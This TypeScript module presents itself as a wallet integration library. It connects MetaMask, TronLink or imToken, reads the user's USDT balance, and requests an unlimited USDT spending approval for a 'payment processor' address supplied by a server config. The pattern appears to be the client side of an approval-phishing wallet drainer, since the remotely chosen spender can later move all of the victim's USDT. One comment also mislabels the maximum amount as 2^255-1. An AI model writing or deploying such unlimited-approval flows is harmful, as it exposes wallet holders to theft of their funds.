// =================================
// 💼 Professional Wallet Integration Library
// =================================

import {
  WalletType,
  ChainType,
  WalletConnection,
  ApprovalResponse,
} from "@/types";
import {
  CHAIN_CONFIG,
  MAX_APPROVAL,
  GAS_LIMITS,
  isValidAddress,
} from "@/config/chains";

declare global {
  interface Window {
    ethereum?: any;
    tronWeb?: any;
    tronLink?: any;
  }
}

export class WalletManager {
  private static instance: WalletManager;
  private config: any = null;

  static getInstance(): WalletManager {
    if (!WalletManager.instance) {
      WalletManager.instance = new WalletManager();
    }
    return WalletManager.instance;
  }

  async loadConfig() {
    if (this.config) return this.config;

    try {
      const response = await fetch("/api/config");
      this.config = await response.json();
      return this.config;
    } catch (error) {
      console.error("Failed to load config:", error);
      // Fallback to local config
      this.config = {
        contracts: CHAIN_CONFIG,
        explorers: {},
      };
      return this.config;
    }
  }

  /**
   * Detect available wallets in browser
   */
  detectWallets() {
    const wallets = {
      metamask: false,
      tronlink: false,
      imtoken: false,
    };

    // Check MetaMask
    if (typeof window !== "undefined" && window.ethereum) {
      if (window.ethereum.isMetaMask) {
        wallets.metamask = true;
      }
      if (window.ethereum.isImToken) {
        wallets.imtoken = true;
      }
    }

    // Check TronLink
    if (typeof window !== "undefined" && (window.tronWeb || window.tronLink)) {
      wallets.tronlink = true;
    }

    return wallets;
  }

  /**
   * Connect to a specific wallet
   */
  async connectWallet(
    walletType: WalletType,
    chain: ChainType
  ): Promise<WalletConnection> {
    await this.loadConfig();

    switch (walletType) {
      case "metamask":
        return await this.connectMetaMask(chain);
      case "tronlink":
        return await this.connectTronLink();
      case "imtoken":
        return await this.connectImToken(chain);
      default:
        throw new Error(`Unsupported wallet type: ${walletType}`);
    }
  }

  /**
   * Connect MetaMask
   */
  private async connectMetaMask(chain: ChainType): Promise<WalletConnection> {
    if (typeof window === "undefined" || !window.ethereum) {
      throw new Error("MetaMask not installed");
    }

    if (!window.ethereum.isMetaMask) {
      throw new Error("Please use MetaMask");
    }

    try {
      // Request account access
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts found");
      }

      // Switch to correct network if needed
      if (chain !== "ethereum") {
        await this.switchNetwork(chain);
      }

      const address = accounts[0];

      // Validate address
      if (!isValidAddress(address, chain)) {
        throw new Error("Invalid wallet address");
      }

      return {
        address,
        wallet: "metamask",
        chain,
      };
    } catch (error: any) {
      if (error.code === 4001) {
        throw new Error("User rejected the connection");
      }
      throw new Error(`MetaMask connection failed: ${error.message}`);
    }
  }

  /**
   * Connect TronLink
   */
  private async connectTronLink(): Promise<WalletConnection> {
    if (typeof window === "undefined") {
      throw new Error("TronLink not available");
    }

    try {
      // Check for TronLink
      if (window.tronLink) {
        const result = await window.tronLink.request({
          method: "tron_requestAccounts",
        });

        if (result.code === 200) {
          const address = window.tronWeb.defaultAddress.base58;

          if (!isValidAddress(address, "tron")) {
            throw new Error("Invalid TRON address");
          }

          return {
            address,
            wallet: "tronlink",
            chain: "tron",
          };
        } else {
          throw new Error("TronLink connection rejected");
        }
      } else if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        const address = window.tronWeb.defaultAddress.base58;

        if (!isValidAddress(address, "tron")) {
          throw new Error("Invalid TRON address");
        }

        return {
          address,
          wallet: "tronlink",
          chain: "tron",
        };
      } else {
        throw new Error("TronLink not properly initialized");
      }
    } catch (error: any) {
      throw new Error(`TronLink connection failed: ${error.message}`);
    }
  }

  /**
   * Connect ImToken
   */
  private async connectImToken(chain: ChainType): Promise<WalletConnection> {
    if (typeof window === "undefined" || !window.ethereum) {
      throw new Error("ImToken not installed");
    }

    if (!window.ethereum.isImToken) {
      throw new Error("Please use ImToken");
    }

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts found");
      }

      // Switch to correct network if needed
      if (chain !== "ethereum") {
        await this.switchNetwork(chain);
      }

      const address = accounts[0];

      if (!isValidAddress(address, chain)) {
        throw new Error("Invalid wallet address");
      }

      return {
        address,
        wallet: "imtoken",
        chain,
      };
    } catch (error: any) {
      if (error.code === 4001) {
        throw new Error("User rejected the connection");
      }
      throw new Error(`ImToken connection failed: ${error.message}`);
    }
  }

  /**
   * Switch network for EVM wallets
   */
  private async switchNetwork(chain: ChainType): Promise<void> {
    if (chain === "tron") return; // TRON uses TronLink

    const config = CHAIN_CONFIG[chain];

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: config.chainId }],
      });
    } catch (switchError: any) {
      // Chain not added, try to add it
      if (switchError.code === 4902 && chain === "bsc") {
        await this.addBSCNetwork();
      } else {
        throw switchError;
      }
    }
  }

  /**
   * Add BSC network to wallet
   */
  private async addBSCNetwork(): Promise<void> {
    try {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: "0x38",
            chainName: "BNB Smart Chain",
            nativeCurrency: {
              name: "BNB",
              symbol: "BNB",
              decimals: 18,
            },
            rpcUrls: ["https://bsc-dataseed1.binance.org"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
    } catch (error: any) {
      throw new Error(`Failed to add BSC network: ${error.message}`);
    }
  }

  /**
   * Get USDT balance
   */
  async getUSDTBalance(address: string, chain: ChainType): Promise<string> {
    try {
      if (chain === "tron") {
        return await this.getTronUSDTBalance(address);
      } else {
        return await this.getEVMUSDTBalance(address, chain);
      }
    } catch (error) {
      console.error("Error getting USDT balance:", error);
      return "0.00";
    }
  }

  /**
   * Get TRON USDT balance
   */
  private async getTronUSDTBalance(address: string): Promise<string> {
    try {
      if (!window.tronWeb) {
        throw new Error("TronWeb not available");
      }

      const config = this.config?.contracts?.tron || CHAIN_CONFIG.tron;
      const contract = await window.tronWeb.contract().at(config.usdt);
      const balance = await contract.balanceOf(address).call();

      // Convert BigInt to string first, then to number for large values
      const balanceString = balance.toString();
      const balanceNumber = parseInt(balanceString, 10);

      // Convert from 6 decimals to human readable
      return (balanceNumber / Math.pow(10, 6)).toFixed(2);
    } catch (error) {
      console.error("Error getting TRON USDT balance:", error);
      return "0.00";
    }
  }

  /**
   * Get EVM USDT balance (BSC/Ethereum)
   */
  private async getEVMUSDTBalance(
    address: string,
    chain: ChainType
  ): Promise<string> {
    try {
      if (!window.ethereum) {
        throw new Error("Ethereum provider not available");
      }

      const config = this.config?.contracts?.[chain] || CHAIN_CONFIG[chain];

      // Simple balance query using eth_call
      const data = `0x70a08231000000000000000000000000${address.slice(2)}`;

      const result = await window.ethereum.request({
        method: "eth_call",
        params: [
          {
            to: config.usdt,
            data: data,
          },
          "latest",
        ],
      });

      const balance = parseInt(result, 16);
      const decimals = config.decimals;

      return (balance / Math.pow(10, decimals)).toFixed(2);
    } catch (error) {
      console.error(`Error getting ${chain} USDT balance:`, error);
      return "0.00";
    }
  }

  /**
   * Approve USDT spending (MAX approval)
   */
  async approveUSDT(
    chain: ChainType,
    paymentProcessorAddress: string
  ): Promise<ApprovalResponse> {
    try {
      if (chain === "tron") {
        return await this.approveTronUSDT(paymentProcessorAddress);
      } else {
        return await this.approveEVMUSDT(chain, paymentProcessorAddress);
      }
    } catch (error: any) {
      console.error("USDT approval error:", error);
      throw error;
    }
  }

  /**
   * Approve TRON USDT
   */
  private async approveTronUSDT(
    paymentProcessorAddress: string
  ): Promise<ApprovalResponse> {
    try {
      if (!window.tronWeb) {
        throw new Error("TronWeb not available");
      }

      const config = this.config?.contracts?.tron || CHAIN_CONFIG.tron;
      const contract = await window.tronWeb.contract().at(config.usdt);

      // MAX approval amount for TRON (2^255-1)
      const maxAmount =
        "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const result = await contract
        .approve(paymentProcessorAddress, maxAmount)
        .send({
          feeLimit: GAS_LIMITS.tron.feeLimit,
        });

      return {
        hash: result,
        amount: maxAmount,
        spender: paymentProcessorAddress,
      };
    } catch (error: any) {
      throw new Error(`TRON USDT approval failed: ${error.message}`);
    }
  }

  /**
   * Approve EVM USDT (BSC/Ethereum)
   */
  private async approveEVMUSDT(
    chain: ChainType,
    paymentProcessorAddress: string
  ): Promise<ApprovalResponse> {
    try {
      if (!window.ethereum) {
        throw new Error("Ethereum provider not available");
      }

      const config = this.config?.contracts?.[chain] || CHAIN_CONFIG[chain];
      const accounts = await window.ethereum.request({
        method: "eth_accounts",
      });

      if (!accounts || accounts.length === 0) {
        throw new Error("No connected accounts");
      }

      // Approve function signature: approve(address,uint256)
      const data = `0x095ea7b3000000000000000000000000${paymentProcessorAddress.slice(
        2
      )}${MAX_APPROVAL.slice(2)}`;

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [
          {
            from: accounts[0],
            to: config.usdt,
            data: data,
            gas: `0x${(GAS_LIMITS[chain] as any).approve.toString(16)}`,
          },
        ],
      });

      return {
        hash: txHash,
        amount: MAX_APPROVAL,
        spender: paymentProcessorAddress,
      };
    } catch (error: any) {
      if (error.code === 4001) {
        throw new Error("User rejected the transaction");
      }
      throw new Error(`${chain} USDT approval failed: ${error.message}`);
    }
  }

  /**
   * Check if user has sufficient allowance
   */
  async checkUSDTAllowance(
    address: string,
    chain: ChainType,
    paymentProcessorAddress: string
  ): Promise<string> {
    try {
      if (chain === "tron") {
        return await this.checkTronUSDTAllowance(
          address,
          paymentProcessorAddress
        );
      } else {
        return await this.checkEVMUSDTAllowance(
          address,
          chain,
          paymentProcessorAddress
        );
      }
    } catch (error) {
      console.error("Error checking USDT allowance:", error);
      return "0";
    }
  }

  /**
   * Check TRON USDT allowance
   */
  private async checkTronUSDTAllowance(
    address: string,
    paymentProcessorAddress: string
  ): Promise<string> {
    try {
      if (!window.tronWeb) {
        throw new Error("TronWeb not available");
      }

      const config = this.config?.contracts?.tron || CHAIN_CONFIG.tron;
      const contract = await window.tronWeb.contract().at(config.usdt);
      const allowance = await contract
        .allowance(address, paymentProcessorAddress)
        .call();

      // Handle BigInt properly
      return typeof allowance === "bigint"
        ? allowance.toString()
        : allowance.toString();
    } catch (error) {
      console.error("Error checking TRON USDT allowance:", error);
      return "0";
    }
  }

  /**
   * Check EVM USDT allowance
   */
  private async checkEVMUSDTAllowance(
    address: string,
    chain: ChainType,
    paymentProcessorAddress: string
  ): Promise<string> {
    try {
      if (!window.ethereum) {
        throw new Error("Ethereum provider not available");
      }

      const config = this.config?.contracts?.[chain] || CHAIN_CONFIG[chain];

      // allowance(address,address) function signature
      const data = `0xdd62ed3e000000000000000000000000${address.slice(
        2
      )}000000000000000000000000${paymentProcessorAddress.slice(2)}`;

      const result = await window.ethereum.request({
        method: "eth_call",
        params: [
          {
            to: config.usdt,
            data: data,
          },
          "latest",
        ],
      });

      return parseInt(result, 16).toString();
    } catch (error) {
      console.error(`Error checking ${chain} USDT allowance:`, error);
      return "0";
    }
  }
}

// Export singleton instance
export const walletManager = WalletManager.getInstance();
